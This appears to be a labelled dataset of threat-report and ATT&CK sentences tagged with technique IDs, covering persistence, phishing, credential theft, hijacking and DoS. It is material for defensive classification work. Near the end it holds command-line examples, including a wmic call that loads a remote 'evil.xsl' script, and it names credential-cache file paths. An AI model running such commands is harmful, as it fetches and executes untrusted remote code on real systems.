598,The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo,T1547
599,Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer,T1547
600,Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path,T1547
601,"Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created",T1547
602,The script saves the decoded and decompressed executable to %APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up,T1547
603,This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim,T1547
604,"In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique",T1547

618,This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’,T1547
619,In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file,T1547
620,The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier,T1547
621,Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence,T1547

624,Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload,T1547
625,"In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk",T1547

628,Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication,T1132
629,The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform,T1132
630,The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload,T1132

636,"It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”",T1132
637,"In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)",T1132
638,Data that is sent is compressed and then base64-encoded before being included in the requests,T1132
639,The C2 server sends back Base64 encoded response,T1132
640,"The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)",T1132
641,A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration,T1132
642,Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories,T1132
643,This encoded information then gets an additional header added and sent across the network.,T1132

656,"Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations",T1566
657,Phishing emails with political themes were used in the majority of the observed attack emails,T1566
658,"In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium",T1566
659,"Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",T1566

662,The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite,T1566
663,"We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",T1566
664,This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments,T1566
665,"MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros",T1566
666,"The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”",T1566
667,"Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018",T1566
668,"In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware",T1566

6,"The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control  address.",T1557
7,Devices in a local network segment communicate with each other by using link layer addresses.,T1557
8,"If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address.",T1557
9,The device with the associated IP address directly replies with its MAC address.,T1557
10,The networked device that made the ARP request will then use as well as store that information in its ARP cache.,T1557

12,"The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device.",T1557
13,"For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner.",T1557
14,Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.,T1557
15,The ARP protocol is stateless and does not require authentication.,T1557
16,"Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.",T1557

36,Windows uses access tokens to determine the ownership of a running process.,T1134
37,A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.,T1134
38,"When this occurs, the process also takes on the security context associated with the new token.",T1134
39,An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.,T1134
40,These token can then be applied to an existing process  Token Impersonation/Theft or used to spawn a new process  Create Process with Token.,T1134
41,An adversary must already be in a privileged user context  administrator to steal a token.,T1134
42,"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.",T1134
43,An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.,T1134
44,"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.",T1134
45,"There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134
46,Duqu examines running system processes for tokens that have specific system privileges.,T1134

65,"The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.",T1546
66,"Depending on the version of Windows, an adversary may take advantage of these features in different ways.",T1546
67,Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.,T1546
68,"In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection .",T1546
69,The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.,T1546
70,"For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program  may be replaced with ""cmd.exe"" .",T1546

178,These tokens are typically stolen from users and used in lieu of login credentials.,T1550
179,Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service .,T1550
180,OAuth is one commonly implemented framework that issues tokens to users for access to systems.,T1550

217,"Within the framework, shims are created to act as a buffer between the program  and the Windows OS.",T1546
218,"When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database .",T1546
219,"If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.",T1546
220,"A list of all shims currently installed by the default Windows installer  is kept in:
* %WINDIR%\AppPatch\sysmain.sdb and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb
Custom databases are stored in:
* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and
* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom
To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim.",T1546
221,"However, certain shims can be used to Bypass User Account Control , inject DLLs into processes , disable Data Execution Prevention  and Structure Exception Handling , and intercept memory addresses .",T1546
222,"Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",T1546

2738,3.,T1189
2739,"Upon finding a vulnerable version, exploit code is delivered to the browser.",T1189
2740,4.,T1189
2741,"If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.",T1189
2742,* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.,T1189
2743,"Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website.",T1189
2744,This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.,T1189
2745,"Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information.",T1189

2795,The dynamic loader will try to find the dylibs based on the sequential order of the search paths.,T1574
2796,"Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.",T1574
2797,"Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present.",T1574
2798,Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.,T1574
2799,Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.,T1574
2800,Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources.,T1574
2801,"Based on the application, this could result in privilege escalation and uninhibited network access.",T1574
2802,This method may also evade detection from security products since the execution is masked under a legitimate process.,T1574
2803,Adversaries may use Windows Dynamic Data Exchange  to execute arbitrary commands.,T1559
2804,DDE is a client-server protocol for one-time and/or continuous inter-process communication  between applications.,T1559

2837,"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.",T1574
2838,LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,T1574
2839,Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen and mmap respectively.,T1574
2840,"On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries  is implemented at a lower level.",T1574

3022,"Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.",T1499
3023,An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service.,T1499
3024,Adversaries can target various layers of the application stack that is hosted on the system used to provide the service.,T1499
3025,"These layers include the Operating Systems , server applications such as web servers, DNS servers, databases, and the  applications that sit on top of them.",T1499
3026,Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components.,T1499
3027,"A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS .",T1499
3028,"To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.",T1499
3029,"Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection.",T1499
3030,This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.,T1499
3031,Botnets are commonly used to conduct DDoS attacks against networks and services.,T1499
3032,Large botnets can generate a significant amount of traffic from systems spread across the global internet.,T1499
3033,"In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources.",T1499
3034,"Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.",T1499
3035,"In cases where traffic manipulation is used, there may be points in the the global network  where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume.",T1499

3041,Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment.,T1480
3042,Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target.,T1480
3043,Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.,T1480
3044,Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload.,T1480
3045,"Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.",T1480
3046,"By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.",T1480
3047,"These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures .",T1480
3048,"Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection.",T1480
3049,Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.,T1480
3050,By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection.,T1480
3051,"Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.",T1480
3052,This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.,T1480
3053,"Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.",T1480
3054,This activity is distinct from typical Virtualization/Sandbox Evasion.,T1480
3055,"While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",T1480
3056,"InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.",T1480

3060,Adversaries may break out of a container to gain access to the underlying host.,T1611
3061,This can allow an adversary access to other containerized resources from the host level or to the host itself.,T1611
3062,"In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.",T1611
3063,There are multiple ways an adversary may escape to a host environment.,T1611
3064,"Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, or utilizing a privileged container to run commands on the underlying host.",T1611
3065,"Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.",T1611
3066,"Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",T1611

3075,These personas may be fictitious or impersonate real people.,T1585
3076,The persona may exist on a single site or across multiple sites .,T1585
3077,Establishing a persona may require development of additional documentation to make them seem real.,T1585

3082,Fox Kitten has created KeyBase accounts to communicate with ransomware victims.,T1585
3083,Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.,T1546
3084,Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries.,T1546
3085,Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code.,T1546
3086,"After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.",T1546
3087,"Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",T1546
3088,"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account.",T1098
3089,"The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.",T1098
3090,Adversaries may also assign mailbox folder permissions through individual folder permissions or roles.,T1098
3091,"Adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store , Inbox, or other mailbox folders.",T1098
3092,"By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.",T1098
3093,This may be used in persistent threat incidents as well as BEC  incidents where an adversary can assign more access rights to the accounts they wish to compromise.,T1098
3094,This may further enable use of additional techniques for gaining access to systems.,T1098
3095,"For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules , so the messages evade spam/phishing detection mechanisms.",T1098

3100,Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer.,T1574
3101,These processes may automatically execute specific binaries as part of their functionality or to perform other actions.,T1574
3102,"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",T1574
3103,"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.",T1574
3104,"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers.",T1574
3105,"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads.",T1574
3106,"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process.",T1574
3107,This behavior is related to and may take advantage of DLL Search Order Hijacking.,T1574
3108,Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.,T1574
3109,Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.,T1574
3110,This behavior is related to Bypass User Account Control.,T1574
3111,Several examples of this weakness in existing common installers have been reported to software vendors.,T1574
3112,If the executing process is set to run at a specific time or during a certain event  then this technique can also be used for persistence.,T1574
3113,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target.,T1480
3114,Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.,T1480
3115,"Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory  domains, and local/external IP addresses.",T1480
3116,Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.,T1480
3117,This use of guardrails is distinct from typical Virtualization/Sandbox Evasion.,T1480
3118,"While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",T1480

3143,"Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key.",T1048
3144,Each end of the communication channels requires a private key  and the public key of the other entity.,T1048
3145,The public keys of each entity are exchanged before encrypted communications begin.,T1048
3146,Network protocols that use asymmetric encryption  often utilize symmetric encryption once keys are exchanged.,T1048

7352,"For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",T1574
7353,Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.,T1574
7354,"Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.",T1574
7355,Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.,T1574
7356,"Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.",T1574

8249,Adversaries may modify plist files to automatically run an application when a user logs in.,T1547
8250,"Starting in Mac OS X 10.7 , users can specify certain applications to be re-opened when a user logs into their machine after reboot.",T1547
8251,"While this is usually done via a Graphical User Interface  on an app-by-app basis, there are property list files  that contain this information as well located at ~/Library/Preferences/com.apple.loginwindow.plist and ~/Library/Preferences/ByHost/com.apple.loginwindow.",T1547
8252,* .plist.,T1547
8253,An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine .,T1547
8254,Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.,T1600
8255,Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext .,T1600
8256,"As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.",T1600
8257,Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.,T1600
8258,Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target.,T1498
8259,This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address.,T1498
8260,This third-party server is commonly termed a reflector.,T1498
8261,An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim.,T1498
8262,"Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used.",T1498
8263,"Likewise, one or more reflector may be used to focus traffic on the target.",T1498
8264,"Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack.",T1498
8265,Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.,T1498
8266,"The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume.",T1498
8267,"Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.",T1498
8268,"In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.",T1498
8269,Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads.,T1620
8270,"Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk.",T1620
8271,"Reflectively loaded payloads may be compiled binaries, anonymous files , or just snubs of fileless executable code .",T1620
8272,Reflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process.,T1620
8273,Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process.,T1620
8274,"Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted  until execution.",T1620

8278,Cuba loaded the payload into memory using PowerShell.,T1620
8279,Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.,T1547
8280,"Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.",T1547
8281,Placing a program within a startup folder will also cause that program to execute when a user logs in.,T1547
8282,There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.,T1547
8283,The startup folder path for the current user is C:\Users\\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.,T1547
8284,The startup folder path for all users is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.,T1547

The following Registry keys can control automatic startup of services during boot:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7.",T1547
8289,"Most of these actions are under the control of the operating system, but you can also add custom actions here.",T1547
8290,The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.,T1547
8291,Programs listed in the load value of the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows run when any user logs on.,T1547
8292,"By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to autocheck autochk *.",T1547
8293,"This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally.",T1547
8294,Adversaries can add other programs or processes to this registry value which will automatically launch at boot.,T1547
8295,"Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots.",T1547
8296,Briba creates run key Registry entries pointing to malicious DLLs dropped to disk.,T1547

10148,Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket.,T1558
10149,Kerberos is an authentication protocol widely used in modern Windows domain environments.,T1558
10150,"In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center .",T1558
10151,"Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated.",T1558
10152,The KDC is responsible for both authentication and ticket granting.,T1558
10153,Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.,T1558
10154,"On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.",T1558
10155,"Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the ""ccache"".",T1558
10156,The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.,T1558
10157,"On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon  handles Kerberos tickets.",T1558
10158,By default SSSD maintains a copy of the ticket database that can be found in /var/lib/sss/secrets/secrets.ldb as well as the corresponding key located in /var/lib/sss/secrets/.secrets.mkey.,T1558
10159,Both files require root access to read.,T1558
10160,"If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket.",T1558
10161,The ccache file may also be converted into a Windows format using tools such as Kekeo.,T1558
10162,"Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux.",T1558
10163,"By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access.",T1558
10164,The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon.,T1558
10165,"Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework.",T1558
10166,Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.,T1558
10167,Adversaries may use steganography techniques in order to prevent the detection of hidden information.,T1027
10168,"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.",T1027

11356,The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs.,T1080
11357,"When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.",T1080
11358,Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory.,T1080

11376,"For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.",T1221
11377,Adversaries may abuse this technology to initially conceal malicious code to be executed via documents.,T1221
11378,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.,T1221
11379,These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators  are present until after the malicious payload is fetched.,T1221
11380,Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.,T1221
11381,This technique may also enable Forced Authentication by injecting a SMB/HTTPS  URL and triggering an authentication attempt.,T1221

11391,Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.,T1055
11392,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.,T1055
11393,"Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL.",T1055
11394,"At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",T1055
11395,This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.,T1055

12919,Adversaries may modify XDG autostart entries to execute programs or commands during system boot.,T1547
12920,Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries.,T1547
12921,These entries will allow an application to automatically start during the startup of a desktop environment after user logon.,T1547
12922,"By default, XDG autostart entries are stored within the /etc/xdg/autostart or ~/.config/autostart directories and have a .desktop file extension.",T1547
12923,"Within an XDG autostart entry file, the Type key specifies if the entry is an application , link  or directory .",T1547
12924,The Name key indicates an arbitrary name assigned by the creator and the Exec key indicates the application and command line arguments to execute.,T1547

12930,Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files.,T1220
12931,Extensible Stylesheet Language  files are commonly used to describe the processing and rendering of data within XML files.,T1220
12932,"To support complex operations, the XSL standard includes support for embedded scripting in various languages.",T1220
12933,Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.,T1220
12934,"Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary   can be installed and used to execute malicious JavaScript embedded within local or remote  XSL files.",T1220
12935,"Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.",T1220
12936,"Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet.",T1220
12937,"Since the XSL file is valid XML, the adversary may call the same XSL file twice.",T1220
12938,When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.,T1220
12939,"Command-line examples:
* msxsl.exe customers.xml script.xsl
* msxsl.exe script.xsl script.xsl
* msxsl.exe script.jpeg script.jpeg
Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.",T1220
12940,"This technique can also execute local/remote scripts and, similar to its Regsvr32/ ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool.",T1220
12941,Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.,T1220
12942,"Command-line examples:
* Local File: wmic process list /FORMAT:evil.xsl
* Remote File: wmic os get /FORMAT:”https://example.com/evil.xsl” Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.",T1220
